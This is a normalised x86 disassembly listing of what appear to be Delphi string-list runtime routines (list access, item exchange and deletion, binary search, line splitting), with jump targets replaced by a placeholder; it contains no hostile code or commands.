or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414734
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41475c
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_41477c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4147d6
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_41402c
call sub_403258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4147e4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41533c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4144d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_414814
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414838
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41485c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414903
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor eax eax
push ebp
push sub_4148e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148ed
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414914
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414500
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor eax eax
push ebp
push sub_414994
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
sub_4149c4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414a7c
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414a1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4151d4
mov eax [ ebp - 0x8 ]
push eax
push sub_415484
push ebp
call sub_4149c4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414a7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b11
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b18
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fcc
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4043b4
jne r-xdata
sub_414b28
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414b24
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
jmp sub_4039e4
sub_414b60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414ba8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405b88
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414b28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414baf
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_414bb8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414c90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor eax eax
push ebp
push sub_414c6e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c75
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
sub_414cac
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414cf1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404468
call sub_4088fc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cf8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_414d00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414e0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404040
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404098
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e12
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fcc
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404268
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404268
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404268
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404268
mov ebx eax
test ebx ebx
je r-xdata
sub_414e28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414ea0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ea7
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414eb4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414f77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4044c8
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_415514
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404190
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c414
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f7e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_414f88
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414fbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414fec
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416050
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415034
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41503b
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_415040
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4150dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor eax eax
push ebp
push sub_4150c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415b9c
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404098
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150c7
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
sub_4150ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41518d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415194
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor eax eax
push ebp
push sub_415170
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
sub_41519c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4151d4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415278
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417ebc
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor eax eax
push ebp
push sub_415253
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_416f58
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418b5c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41525a
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
sub_415284
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416050
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4152cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4152d6
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_4152dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415329
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404268
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415e00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415330
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_41533c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4056dc
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415370
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4153b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4041a0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153ba
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_4153c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415474
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor edx edx
push ebp
push sub_415457
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41545e
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404098
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_415484
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4154fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_419708
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_419710
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415501
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4197b0
inc esi
dec ebx
jne r-xdata
sub_41552c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_415548
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4147e4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a30
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4155b0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414b60
jmp r-xdata
sub_41564c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a30
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41568c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414b60
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b1c
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_4156f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414b60
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414b60
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_415754
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415754
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_415778
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
